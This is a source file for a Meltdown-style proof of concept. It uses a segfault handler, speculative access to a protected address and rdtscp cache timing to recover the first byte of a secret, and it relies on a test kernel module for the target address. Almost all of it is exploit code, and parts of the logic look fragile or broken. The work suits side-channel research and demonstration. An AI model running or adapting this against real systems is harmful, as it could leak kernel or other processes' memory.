#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <x86intrin.h>
#include <fcntl.h>
#include <sys/ioctl.h>

static unsigned char* rewrite_location = 0;
unsigned char prevOpCode;

static void* protectedMapping;

static void handler(int signum, siginfo_t* info, void* arg) {

  ucontext* context = (ucontext*)arg;
  context->uc_mcontext.gregs[REG_RIP]+=67;
  
  context->uc_mcontext.gregs[REG_EFL] = 0; //Clear error flags so system doesn't actually fault.
  //printf("SEGFAULT\n");
}
static unsigned char* unprotected_mapping;
unsigned char data;


static unsigned long long hack_address(unsigned char* protectedAddress,size_t i) {
  
  
  //Read protected byte
  data = 0;
  unprotected_mapping[(*protectedAddress)*81920]*=2;
  data = 5;
  //printf("Data is %i\n",(int)data);
  asm("nop;nop;nop;nop;nop");
  size_t candidate = 0;
  unsigned int junk;
    unsigned long long start;
    unsigned long long end;
    start = __rdtscp(&junk);
    data = unprotected_mapping[i*81920];
    end = __rdtscp(&junk);
  
  return end-start;
}



int main(int argc, char** argv) {
  int kernelmodule = open("test",O_RDWR);
  ioctl(kernelmodule,52,&protectedMapping); //NOTE: Requires special kernel module that returns a protected memory address.
  
  struct sigaction act = {};
  act.sa_sigaction = handler;
  act.sa_flags = SA_SIGINFO;
  sigemptyset(&act.sa_mask);
  sigaction(SIGSEGV,&act,0);
  
  
  unprotected_mapping = (unsigned char*)mmap(0,256*81920,PROT_READ | PROT_WRITE,MAP_ANONYMOUS | MAP_PRIVATE,0,0);
  printf("Created protected mapping at %p\n",protectedMapping);
  printf("Unprotected mapping starts at %p\n",unprotected_mapping);
  
  //Uncomment to show that cache backchannel works.
  //protectedMapping = (void*)"Test";
  
  
  
  unsigned long long values[256] = {0};
  char* unrelated_data = new char[1000*1000];
  
  for(size_t i = 0;i<256*50;i++) {
    memset(unrelated_data,0,1000*1000);
    values[i % 256]+=hack_address((unsigned char*)protectedMapping,i % 256);
  }
  
  unsigned long long bestFit;
  memset(&bestFit,255,sizeof(bestFit));
  char bestValue;
  for(size_t i = 0;i<256;i++) {
    if(values[i]<bestFit) {
      bestFit = values[i];
      bestValue = (char)i;
    }
  }
  
  printf("The first byte in the secret is %c\n",bestValue);
    
    
  sleep(-1);
}